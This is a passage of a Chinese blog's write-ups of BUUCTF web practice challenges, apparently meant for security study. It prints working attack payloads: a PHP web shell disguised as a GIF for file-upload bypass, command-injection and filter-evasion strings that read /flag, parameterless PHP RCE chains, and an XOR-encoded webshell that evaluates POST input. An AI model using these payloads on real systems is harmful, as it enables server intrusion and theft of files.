class="keyword">$cmd)</span></span><br></pre></td></tr></table></figure><p>对<code>cmd</code>传参内容进行了很多的过滤，可以看到<code>cat</code>被ban了，但是对<code>\</code>用了<code>\\</code>来过滤，之前打比赛遇到过，这样匹配其实匹配不到<code>\</code>，因此可以借助<code>ca\t</code>来绕过，这里其实还可以用<code>sort</code>命令来读取flag的。</p><blockquote><p><strong>sort</strong>：sort将文件的每一行作为一个单位，相互比较，比较原则是从首字符向后，依次按ASCII码值进行比较，最后将他们按升序输出。</p></blockquote><p>其实Linux中对命令过滤的绕过方式还很多，参考<a href="https://www.cnblogs.com/-chenxs/p/11978488.html">这里</a></p><p>另一个考点是<code>MD5</code>强比较绕过：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是固定用法：</p><figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">a=<span class="symbol">%4</span>d<span class="symbol">%c9</span><span class="symbol">%68</span><span class="symbol">%ff</span><span class="symbol">%0</span>e<span class="symbol">%e3</span><span class="symbol">%5</span><span class="keyword">c</span><span class="symbol">%20</span><span class="symbol">%95</span><span class="symbol">%72</span><span class="symbol">%d4</span><span class="symbol">%77</span><span class="symbol">%7</span>b<span class="symbol">%72</span><span class="symbol">%15</span><span class="symbol">%87</span><span class="symbol">%d3</span><span class="symbol">%6</span>f<span class="symbol">%a7</span><span class="symbol">%b2</span><span class="symbol">%1</span>b<span class="symbol">%dc</span><span class="symbol">%56</span><span class="symbol">%b7</span><span class="symbol">%4</span>a<span class="symbol">%3</span>d<span class="symbol">%c0</span><span class="symbol">%78</span><span class="symbol">%3</span>e<span class="symbol">%7</span>b<span class="symbol">%95</span><span class="symbol">%18</span><span class="symbol">%af</span><span class="symbol">%bf</span><span class="symbol">%a2</span><span class="symbol">%00</span><span class="symbol">%a8</span><span class="symbol">%28</span><span class="symbol">%4</span>b<span class="symbol">%f3</span><span class="symbol">%6</span>e<span class="symbol">%8</span>e<span class="symbol">%4</span>b<span class="symbol">%55</span><span class="symbol">%b3</span><span class="symbol">%5</span>f<span class="symbol">%42</span><span class="symbol">%75</span><span class="symbol">%93</span><span class="symbol">%d8</span><span class="symbol">%49</span><span class="symbol">%67</span><span class="symbol">%6</span>d<span class="symbol">%a0</span><span class="symbol">%d1</span><span class="symbol">%55</span><span class="symbol">%5</span>d<span class="symbol">%83</span><span class="symbol">%60</span><span class="symbol">%fb</span><span class="symbol">%5</span>f<span class="symbol">%07</span><span class="symbol">%fe</span><span class="symbol">%a2</span></span><br><span class="line">&amp;b=<span class="symbol">%4</span>d<span class="symbol">%c9</span><span class="symbol">%68</span><span class="symbol">%ff</span><span class="symbol">%0</span>e<span class="symbol">%e3</span><span class="symbol">%5</span><span class="keyword">c</span><span class="symbol">%20</span><span class="symbol">%95</span><span class="symbol">%72</span><span class="symbol">%d4</span><span class="symbol">%77</span><span class="symbol">%7</span>b<span class="symbol">%72</span><span class="symbol">%15</span><span class="symbol">%87</span><span class="symbol">%d3</span><span class="symbol">%6</span>f<span class="symbol">%a7</span><span class="symbol">%b2</span><span class="symbol">%1</span>b<span class="symbol">%dc</span><span class="symbol">%56</span><span class="symbol">%b7</span><span class="symbol">%4</span>a<span class="symbol">%3</span>d<span class="symbol">%c0</span><span class="symbol">%78</span><span class="symbol">%3</span>e<span class="symbol">%7</span>b<span class="symbol">%95</span><span class="symbol">%18</span><span class="symbol">%af</span><span class="symbol">%bf</span><span class="symbol">%a2</span><span class="symbol">%02</span><span class="symbol">%a8</span><span class="symbol">%28</span><span class="symbol">%4</span>b<span class="symbol">%f3</span><span class="symbol">%6</span>e<span class="symbol">%8</span>e<span class="symbol">%4</span>b<span class="symbol">%55</span><span class="symbol">%b3</span><span class="symbol">%5</span>f<span class="symbol">%42</span><span class="symbol">%75</span><span class="symbol">%93</span><span class="symbol">%d8</span><span class="symbol">%49</span><span class="symbol">%67</span><span class="symbol">%6</span>d<span class="symbol">%a0</span><span class="symbol">%d1</span><span class="symbol">%d5</span><span class="symbol">%5</span>d<span class="symbol">%83</span><span class="symbol">%60</span><span class="symbol">%fb</span><span class="symbol">%5</span>f<span class="symbol">%07</span><span class="symbol">%fe</span><span class="symbol">%a2</span></span><br></pre></td></tr></table></figure><p>其实原理是生成两个txt文件，文件内容只有几位不同，但最后的md5值是相同的。</p><h3 id="解题-10"><a href="#解题-10" class="headerlink" title="解题"></a>解题</h3><p>利用<code>cmd</code>传参<code>sort%20/flag</code>或<code>ca\t%20/flag</code>即可，当然<code>c\at</code>效果一样，这与linux的命令相关，最后拿到flag。<br><img src="http://www.ggb0n.cool/images/BUUCTF-web61.png" alt=""><br><strong>巨坑！如果想要用BP抓包改POST的内容，web端一定是要POST传数据，不能GET传参之后抓包再改成POST，否则失败！</strong></p><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>常规文件上传题，对后缀名进行了过滤，一般用<code>php</code>、<code>php3</code>、<code>php4</code>、<code>php5</code>、<code>phtml</code>、<code>pht</code>来绕过，本题是利用<code>pht</code>绕过的。<br>本题也对<code>&lt;?</code>进行了过滤，利用<code>GIF89a &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[shell])&lt;/script&gt;</code>即可。</p><h3 id="解题-11"><a href="#解题-11" class="headerlink" title="解题"></a>解题</h3><p>上传构造好的小马，抓包之后把文件类型改为<code>image/jpg</code>上传之后即可成功解析<br><img src="http://www.ggb0n.cool/images/BUUCTF-web63.png" alt=""><br>小马存在了<code>/upload</code>路径下，蚁剑连接拿flag。<br><img src="http://www.ggb0n.cool/images/BUUCTF-web62.png" alt=""></p><h2 id="CISCN-2019-Love-Math"><a href="#CISCN-2019-Love-Math" class="headerlink" title="[CISCN 2019]Love Math"></a>[CISCN 2019]Love Math</h2><p>主要考察PHP基本函数的利用，还有变量与函数关联的知识</p><h3 id="补充知识-1"><a href="#补充知识-1" class="headerlink" title="补充知识"></a>补充知识</h3><p>一些基本的函数：</p><blockquote><p><code>scandir()</code>函数：返回指定目录中的文件和目录的数组。<br><code>base_convert()</code>函数：在任意进制之间转换数字。<br><code>dechex()</code>函数：把十进制转换为十六进制。<br><code>hex2bin()</code>函数：把十六进制值的字符串转换为 ASCII 字符。<br><code>var_dump()</code>函数:用于输出变量的相关信息。<br><code>readfile()</code>函数：输出一个文件。该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回<code>false</code>。您可以通过<code>@readfile()</code>形式调用该函数，来隐藏错误信息。</p></blockquote><p><strong>动态函数</strong></p><blockquote><p>php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数例如：<code>$function = &quot;sayHello&quot;;$function();</code></p></blockquote><p><strong>php中函数名默认为字符串</strong></p><blockquote><p>例如本题白名单中的<code>asinh</code>和<code>pi</code>可以直接异或，这就增加了构造字符的选择.</p></blockquote><h3 id="题目分析-10"><a href="#题目分析-10" class="headerlink" title="题目分析"></a>题目分析</h3><p>打开连接，给出了源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析源码可知，对参数内容作了以下的限制：</p><ul><li>1、长度不能超过80；</li><li>2、不能包含<code></code>,<code>\t</code>,<code>\r</code>,<code>\n</code>,<code>&#39;</code>,<code>&quot;</code>,<code>反引号</code>,<code>[</code>,`]`` 这些字符；</li><li>3、不能有不是$whitelist白名单里面的字符串出现；</li></ul><p>单单传参<code>c</code>肯定是不行了，有两种思路来拿flag：<br><strong>加一个参数</strong>：我们需要构造个<code>$_GET[1]</code>，然后再拿flag，但是<code>[</code>、<code>]</code>都不能用，因此不能直接构造，这个时候我们就可以利用白名单中的那些函数来构造。<br><strong>直接cat flag</strong>：也需要用到上面说的一些函数来构造。<br>主要用到<code>base_convert</code>、<code>dechex</code>两个函数，同时将<code>pi</code>、<code>abs</code>当做参数来利用。</p><h3 id="解题-12"><a href="#解题-12" class="headerlink" title="解题"></a>解题</h3><h4 id="加参数"><a href="#加参数" class="headerlink" title="加参数"></a>加参数</h4><p>构造<code>&amp;_GET</code>传参：<br>payload 1：</p><figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">$<span class="literal">pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));($$<span class="literal">pi</span>)&#123;<span class="literal">pi</span>&#125;(($$<span class="literal">pi</span>)&#123;<span class="built_in">abs</span>&#125;)&amp;<span class="literal">pi</span>=system&amp;<span class="built_in">abs</span>=cat /<span class="built_in">flag</span></span><br><span class="line"></span><br><span class="line">base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>) =&gt; <span class="string">"hex2bin"</span></span><br><span class="line">dechex(<span class="number">1598506324</span>) =&gt; <span class="string">"5f474554"</span></span><br><span class="line">$<span class="literal">pi</span>=hex2bin(<span class="string">"5f474554"</span>) =&gt; $<span class="literal">pi</span>=<span class="string">"_GET"</span>   <span class="comment">//hex2bin将一串16进制数转换为二进制字符串</span></span><br><span class="line">($$<span class="literal">pi</span>)&#123;<span class="literal">pi</span>&#125;(($$<span class="literal">pi</span>)&#123;<span class="built_in">abs</span>&#125;) =&gt; ($<span class="variable">_GET</span>)&#123;<span class="literal">pi</span>&#125;($<span class="variable">_GET</span>)&#123;<span class="built_in">abs</span>&#125;  <span class="comment">//&#123;&#125;可以代替[]</span></span><br></pre></td></tr></table></figure><p>但是这种方法会报<code>400 Bad Request</code>，可能跟构造的<code>&amp;_GET</code>相关，网上参考到不能<code>&amp;_GET</code>传参，可以用<code>header</code>来传，可以构造如下：<br>payload 2</p><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">$pi=base_convert,$pi(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)($pi(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>)()&#123;<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line">base_convert(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>) =&gt; <span class="string">"exec"</span></span><br><span class="line">$pi(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>) =&gt; <span class="string">"getallheaders"</span></span><br><span class="line">exec(getallheaders()&#123;<span class="number">1</span>&#125;)</span><br><span class="line"><span class="comment">//操作xx和yy，中间用逗号隔开，echo都能输出</span></span><br><span class="line">echo xx,yy</span><br></pre></td></tr></table></figure><p>这里用到了<code>apache</code>下的<code>getallheaders</code>这个函数：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web64.png" alt=""><br>我们结合这个payload，抓包之后在其中添上<code>1: cat /flag</code>(<strong>这里需要注意一下，BUU的flag都在根目录下，直接cat /flag即可，网上一些参考题解是cat flag.php是读不到的</strong>)，拿到flag：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web65.png" alt=""></p><h4 id="直接构造拿cat-flag"><a href="#直接构造拿cat-flag" class="headerlink" title="直接构造拿cat /flag"></a>直接构造拿cat /flag</h4><figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">//exec('hex2bin(<span class="name">dechex</span>(<span class="number">109270211257898</span>))') =&gt; exec('cat f*')</span><br><span class="line">($pi=base_convert)(<span class="number">22950</span>,<span class="number">23</span>,<span class="number">34</span>)($pi(<span class="number">76478043844</span>,<span class="number">9</span>,<span class="number">34</span>)(<span class="name">dechex</span>(<span class="number">109270211257898</span>)))</span><br><span class="line">//system('cat'.dechex(<span class="number">16</span>)^asinh^pi) =&gt; system('cat *')</span><br><span class="line">base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))</span><br><span class="line">这两条是参考网上的题解，没有做出更改，用的话稍微改一下即可</span><br></pre></td></tr></table></figure><h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>考察无参数RCE，参考<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE">这篇文章</a></p><h3 id="题目分析-11"><a href="#题目分析-11" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目只有一句<code>flag在哪？</code>其实有点无从下手，参考网上的题解提示是<code>git泄露</code>，但是用<code>githack</code>没跑出来，最后还是用<code>gitextract</code>跑出来了源码：(githack得更新了…)</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们需要用<code>exp</code>传参，但是参数会经过三层正则匹配的过滤：<br>第一层：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])</span><br></pre></td></tr></table></figure><p>这一层过滤了常用的PHP伪协议<br>第二层：</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, NULL, $_GET[<span class="string">'exp'</span>])</span></span>)</span><br></pre></td></tr></table></figure><p>这一层的匹配明显提示我们是无参数RCE，其中的<code>?R</code>是递归地进行匹配<br>第三次：</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg<span class="constructor">_match('<span class="operator">/</span><span class="params">et</span>|<span class="params">na</span>|<span class="params">info</span>|<span class="params">dec</span>|<span class="params">bin</span>|<span class="params">hex</span>|<span class="params">oct</span>|<span class="params">pi</span>|<span class="params">log</span><span class="operator">/</span><span class="params">i</span>', $<span class="params">_GET</span>['<span class="params">exp</span>'])</span>)</span><br></pre></td></tr></table></figure><p>过滤掉常见的关键字。<br>直接getflag不现实了，那就想办法利用函数来获取。</p><h3 id="解题-13"><a href="#解题-13" class="headerlink" title="解题"></a>解题</h3><p>首先需要获取当前目录下的文件，可以实现的函数有<code>scandir(.)</code>(.表示当前目录)，但是<code>.</code>又不能用，此时想到<code>localeconv()</code>：函数返回一包含本地数字及货币格式信息的数组。数组的第一项就是<code>.</code><br>这时再借助<code>current()/pos()</code>返回数组中的当前单元, 默认取第一个值。也就是说<code>current(localeconv())</code>就是<code>.</code>了。<br>payload如下：</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">/?exp=print<span class="constructor">_r(<span class="params">scandir</span>(<span class="params">current</span>(<span class="params">localeconv</span>()</span>)));</span><br><span class="line">/?exp=print<span class="constructor">_r(<span class="params">scandir</span>(<span class="params">pos</span>(<span class="params">localeconv</span>()</span>)));</span><br></pre></td></tr></table></figure><p><img src="http://www.ggb0n.cool/images/BUUCTF-web66.png" alt=""><br>可以看到<code>flag.php</code>在第四个数组元素中，读取它的源码就能拿到flag。如何读取倒数第二个数组元素呢？</p><p>这里有三种方法：<br><strong>1、array_reverse()</strong><br>以相反的顺序返回数组元素，再结合函数<code>next()</code>即可。这里构造payload：</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">/?exp=print<span class="constructor">_r(<span class="params">next</span>(<span class="params">array_reverse</span>(<span class="params">scandir</span>(<span class="params">current</span>(<span class="params">localeconv</span>()</span>)))));</span><br></pre></td></tr></table></figure><p>效果如下：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web67.png" alt=""><br><strong>2、array_rand()和array_flip()</strong><br><code>array_flip()</code>交换数组的键和值；<br><code>array_rand()</code>从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回，本题目中scandir()返回的数组只有5个元素，刷新几次就能刷出来<code>flag.php</code>。<br>构造payload：</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">/?exp=print<span class="constructor">_r(<span class="params">array_rand</span>(<span class="params">array_flip</span>(<span class="params">scandir</span>(<span class="params">current</span>(<span class="params">localeconv</span>()</span>)))));</span><br></pre></td></tr></table></figure><p>效果如下：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web68.png" alt=""><br><strong>3、session_id(session_start())</strong><br><code>session_start()</code>启动新会话或者重用现有会话；<br><code>session_id()</code>获取到当前的session id;<br>本题目虽然ban了hex关键字，导致hex2bin()被禁用，但是我们可以并不依赖于十六进制转ASCII的方式，因为flag.php这些字符是PHPSESSID本身就支持的。<br>这里使用<code>session</code>之前需要通过<code>session_start()</code>告诉<code>PHP</code>使用<code>session</code>，<code>php</code>默认是不主动使用<code>session</code>的。然后利用<code>session_id()</code>获取到当前的session id。我们再在<code>header</code>中设置<code>PHPSESSID</code>的<code>cookie</code>，值就为<code>flag.php</code>，效果如下：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web70.png" alt=""></p><p>最后如何获取源码呢？<br>因为<code>et</code>被ban，所以可以用<code>readfile()</code>或<code>highlight_file()</code>以及其别名函数<code>show_source()</code>，结合几种方法，最终构造下列payload：</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">/?exp=readfile(next(<span class="built_in">array</span><span class="constructor">_reverse(<span class="params">scandir</span>(<span class="params">current</span>(<span class="params">localeconv</span>()</span>)))));</span><br><span class="line">/?exp=show<span class="constructor">_source(<span class="params">next</span>(<span class="params">array_reverse</span>(<span class="params">scandir</span>(<span class="params">current</span>(<span class="params">localeconv</span>()</span>)))));</span><br><span class="line">/?exp=show<span class="constructor">_source(<span class="params">session_id</span>(<span class="params">session_start</span>()</span>));  <span class="comment">//配合BP使用</span></span><br><span class="line">... 自己组合吧</span><br></pre></td></tr></table></figure><p>拿到flag：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web69.png" alt=""></p><h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><p>考察的知识有点杂，主要涉及<strong>构造不包含数字和字母的webshell</strong>、<strong>文件上传绕过</strong>、<strong>绕过open_basedir/disable_function</strong><br>知识量有点大，好好记录一下。</p><h3 id="知识拓展"><a href="#知识拓展" class="headerlink" title="知识拓展"></a>知识拓展</h3><h4 id="构造不包含数字和字母的webshell"><a href="#构造不包含数字和字母的webshell" class="headerlink" title="构造不包含数字和字母的webshell"></a>构造不包含数字和字母的webshell</h4><p>首先，明确思路。我的核心思路是，将非字母、数字的字符经过各种变换，最后能构造出<code>a-z</code>中任意一个字符。然后再利用PHP允许动态函数执行的特点，拼接处一个函数名，如<code>assert</code>，然后动态执行之即可。那么，变换方法 将是解决本题的要点。</p><p>不过在此之前，我需要说说php5和7的差异。</p><p><code>php5</code>中<code>assert</code>是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码。</p><p>但<code>php7</code>中，<code>assert</code>不再是函数，变成了一个语言结构（类似<code>eval</code>），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用<code>file_put_contents</code>函数，同样可以用来<code>getshell</code>。<br>以上参考<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">P神的博客</a>。<br>这里介绍三种构造shell的方法：<br><strong>1、利用异或</strong><br>在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到<code>a-z</code>中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。<br>在PHP中，两个变量进行异或时，先会将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或之后，又将结果从二进制转换成了ASCII值，再将ASCII值转换成字符串。异或操作有时也被用来交换两个变量的值。<br>这里附上一个网上看到的代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$l = <span class="string">""</span>;</span><br><span class="line">$r = <span class="string">""</span>;</span><br><span class="line">$argv = str_split(<span class="string">"_GET"</span>);</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($argv);$i++)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;<span class="number">255</span>;$j++)</span><br><span class="line">    &#123;</span><br><span class="line">        $k = chr($j)^chr(<span class="number">255</span>);      \\dechex(<span class="number">255</span>) = ff</span><br><span class="line">        <span class="keyword">if</span>($k == $argv[$i])&#123;</span><br><span class="line">            <span class="keyword">if</span>($j&lt;<span class="number">16</span>)&#123;</span><br><span class="line">                $l .= <span class="string">"%ff"</span>;</span><br><span class="line">                $r .= <span class="string">"%0"</span> . dechex($j);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $l .= <span class="string">"%ff"</span>;</span><br><span class="line">            $r .= <span class="string">"%"</span> . dechex($j);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\&#123;$l`$r\&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后配合下面的payload，可以执行一些函数。</p><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">$&#123;<span class="meta">%</span>ff<span class="meta">%</span>ff<span class="meta">%</span>ff<span class="meta">%</span>ff^<span class="meta">%</span>a<span class="number">0</span><span class="meta">%</span>b<span class="number">8</span><span class="meta">%</span>ba<span class="meta">%</span>ab&#125;&#123;<span class="meta">%</span>ff&#125;<span class="comment">()</span>;&amp;ff=phpi<span class="symbol">nfo</span></span><br></pre></td></tr></table></figure><p>抛开这道题，还可以类似这样地使用：</p><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>/?<span class="number">_</span>=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;(<span class="string">"type index.php"</span>);&amp;%ff=<span class="keyword">system</span>。</span><br></pre></td></tr></table></figure><p>最后的exp:</p><figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">$a = (%9e ^ %ff).(%8c ^ %ff).(%8c ^ %ff).(%9a ^ %ff).(%8d ^ %ff).(%8b ^ %ff);</span><br><span class="line">\\assert</span><br><span class="line">$b = <span class="string">"_"</span> . (%af ^ %ff).(%b0 ^ %ff).(%ac ^ %ff).(%ab ^ %ff);$c = $$b;</span><br><span class="line">\\$b = $_POST</span><br><span class="line">$a($c[<span class="number">777</span>]);</span><br></pre></td></tr></table></figure><p><strong>2、取反构造</strong><br>与<code>方法1</code>有异曲同工之妙，唯一差异就是，<code>方法1</code>使用的是位运算里的<code>异或</code>，本方法使用的是位运算里的<code>取反</code>。<br>本方法利用的是<code>UTF-8</code>编码的某个汉字，并将其中某个字符取出来，比如<code>&#39;和&#39;{2}</code>的结果是<code>\x8c</code>，其取反即为字母<code>s</code>，还有一些其他的如下图：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web71.jpg" alt=""><br>图片来源于P神的那篇文章。<br>当然，在这道题里已经过滤了数字，那怎么来构造<code>{}</code>中的数字呢？<br>这个可以利用PHP的弱类型特性：<code>true</code>的值为<code>1</code>，故<code>true+true==2</code>，也就是<code>(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)==2</code>。<br>然后便可以一步一步构造即可。<br>后面有一篇博客里<code>[SUCTF 2018]GetShell</code>这道题用到了这个知识点。<br><strong>3、自增构造</strong><br>参考<a href="http://php.net/manual/zh/language.operators.increment.php">http://php.net/manual/zh/language.operators.increment.php</a><br>可以了解到<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code>，<code>&#39;b&#39;++ =&gt; &#39;c&#39;</code>… 